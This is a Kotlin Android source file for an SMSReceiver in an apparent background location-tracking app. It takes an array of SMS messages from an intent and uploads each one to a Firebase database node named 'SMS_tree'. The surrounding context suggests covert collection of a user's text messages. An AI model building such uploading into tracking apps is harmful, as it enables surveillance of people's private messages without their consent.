package com.plcoding.backgroundlocationtracking

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener

class SMSReceiver: BroadcastReceiver() {
    override fun onReceive(p0: Context?, p1: Intent?) {
        //Check if the received Intent has the correct action
        if (p1 != null) {
            if (p1.action == "ACTION_SEND_SMS") {
                //Extract smsArray from the Intent
                val smsArray = p1.getStringArrayExtra("smsArray")
                println("Received new intent! smsList: $smsArray")

                // Process the received SMS messages
                smsArray?.let {
                    val sb = StringBuilder()
                    for (sms in it) {
                        sb.append(sms)
                            .append("\n")
                    // Append each SMS message to StringBuilder with a newline
                    }
                    val formattedMessages = sb.toString()
                    println("Received SMS messages:\n$formattedMessages")


                    val database: FirebaseDatabase = FirebaseDatabase.getInstance()
                    val smsRef: DatabaseReference = database.getReference("SMS_tree")


                    // Loop through the SMS list and push each message to Firebase
                    for (sms in smsArray) {
                        // Check if the SMS message already exists in the database
                        smsRef.addListenerForSingleValueEvent(object :
                            ValueEventListener {
                            override fun onDataChange(dataSnapshot: DataSnapshot) {
                                // Don't check if SMS message exists in the database, push anyways
                                val key = smsRef.push().key
                                if (key != null) {
                                    smsRef.child(key).setValue(sms)
                                    println("SMS Added to Firebase: $sms")

                                }
                            }

                            override fun onCancelled(databaseError: DatabaseError) {
                                // Handle database error
                                println("Error adding data: ${databaseError.message}")
                            }
                        })
                    }

                }
            }
        }
    }
}